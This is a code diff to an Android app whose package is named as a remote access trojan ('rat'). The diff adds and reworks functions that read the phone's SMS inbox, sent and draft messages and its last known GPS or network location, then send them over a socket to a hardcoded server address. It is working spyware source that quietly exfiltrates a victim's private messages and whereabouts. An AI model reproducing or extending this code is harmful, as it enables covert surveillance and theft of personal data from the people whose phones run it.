@@ -1,6 +1,13 @@
 package ru.awawa.rat.server
 
+import android.Manifest
+import android.content.Context
+import android.content.pm.PackageManager
+import android.location.LocationManager
+import android.provider.Telephony
+import android.telephony.TelephonyManager
 import android.util.Log
+import androidx.core.app.ActivityCompat
 import io.ktor.network.selector.*
 import io.ktor.network.sockets.*
 import io.ktor.utils.io.*
@@ -22,7 +29,7 @@ import java.util.logging.Logger
 object Interactor {
 
     private const val TAG = "Interactor"
-    private const val SERVER_IP = "10.0.2.2"
+    private const val SERVER_IP = "192.168.0.101"
     private const val SERVER_PORT = 33455
 
     private const val dataDivider = ":|:"
@@ -112,26 +119,59 @@ object Interactor {
 
             val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
 
-            val inbox = SmsHelper.readMessages(Application.context, SmsHelper.INBOX).joinToString("\n") { it }
-            socket.getOutputStream().write(
-                "sms${dataDivider}$uuid${dataDivider}INBOX${dataDivider}$inbox\n".toByteArray()
-            )
+            var toSend = "sms${dataDivider}$uuid\n"
+            val inbox = SmsHelper.readInbox(Application.context).joinToString("\n") { it }
+            toSend += "INBOX:\n$inbox\n"
 
-            val sent = SmsHelper.readMessages(Application.context, SmsHelper.SENT).joinToString("\n") { it }
-            socket.getOutputStream().write(
-                "sms${dataDivider}$uuid${dataDivider}SENT${dataDivider}$sent\n".toByteArray()
-            )
+            val sent = SmsHelper.readSent(Application.context).joinToString("\n") { it }
+            toSend += "SENT:\n$sent\n"
 
-            val draft = SmsHelper.readMessages(Application.context, SmsHelper.DRAFT).joinToString("\n") { it }
-            socket.getOutputStream().write(
-                "sms${dataDivider}$uuid${dataDivider}DRAFT${dataDivider}$draft\n".toByteArray()
-            )
+            val draft = SmsHelper.readDraft(Application.context).joinToString("\n") { it }
+            toSend += "DRAFT:\n$draft\n"
 
+            socket.getOutputStream().write(toSend.toByteArray())
             val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)
 
             if (result[0] != "ok") {
                 val error = result.getOrElse(1) { "" }
                 Log.e(TAG, "SMS sending failed: $error")
+            }
+
+            socket.close()
+        }
+    }
+
+    fun sendLocation() {
+        GlobalScope.launch(Dispatchers.IO) {
+            val socket = Socket()
+            socket.connect(InetSocketAddress(SERVER_IP, SERVER_PORT))
+
+            val uuid = Preferences.get<String>(Preferences.PreferencesField.UUID) ?: ""
+
+            val locationManager = Application.context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager?
+            val lastLocation = if (ActivityCompat.checkSelfPermission(
+                    Application.context,
+                    Manifest.permission.ACCESS_FINE_LOCATION
+                ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
+                    Application.context,
+                    Manifest.permission.ACCESS_COARSE_LOCATION
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                "Unknown"
+            } else {
+                val l = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                    ?: locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                "Longitude: ${l?.longitude} Latitude: ${l?.latitude}"
+            }
+
+            socket.getOutputStream().write(
+                "location${dataDivider}$uuid${dataDivider}$lastLocation\n".toByteArray()
+            )
+            val result = socket.getInputStream().bufferedReader().readLine().split(dataDivider)
+
+            if (result[0] != "ok") {
+                val error = result.getOrElse(1) { "" }
+                Log.e(TAG, "Location sending failed: $error")
             }
 
             socket.close()
